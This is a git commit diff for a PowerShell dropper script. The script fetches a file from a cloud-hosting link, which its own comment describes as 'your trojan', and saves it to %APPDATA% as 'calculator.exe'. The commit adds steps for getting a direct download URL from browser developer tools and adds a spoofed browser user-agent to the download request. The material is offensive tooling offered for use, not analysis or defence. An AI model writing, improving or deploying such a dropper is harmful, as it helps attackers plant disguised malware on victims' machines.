4b0d2ebb62eb7744b62bcd91693accd67070d950
Grant Knoetze <69013855+Grant-Knoetze@users.noreply.github.com>
2025-03-18 02:26:41 +0200

    Add comments
    Add comments to direct the user to use a direct
    download link to work with InvokeWebRequest.

--- downloadExecuteInvokeWebRequest.ps1
+++ downloadExecuteInvokeWebRequest.ps1
@@ -1,4 +1,9 @@
 # Define the URL of the file to download
+# Define the URL of the file to download
+# Use a direct dowload link if your link to the cloud hosted executable is not working, In the Developer Tools window, click on the Network tab.
+# Make sure the Preserve log option is checked (this ensures the log isn't cleared when the page reloads).
+# Click the Download button again to start the download.
+# In the Network tab, look for a request that starts with download?. Copy this entire URL (It is long) and place it as the $WebFile contents.
 $WebFile = " " # Add a link to your trojan here in Dropbox or OneDrive or any cloud hosting service you like.
 
 # Define the destination path for the downloaded file
@@ -7,7 +12,7 @@ $destination = "$env:APPDATA\calculator.exe"
 # Download the file using Invoke-WebRequest
 try {
     Write-Host "Downloading file from $WebFile..."
-    Invoke-WebRequest -Uri $WebFile -OutFile $destination
+    Invoke-WebRequest -Uri $WebFile -OutFile $destination -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
     Write-Host "File downloaded successfully to $destination."
 } catch {
     Write-Host "Failed to download file: $_"
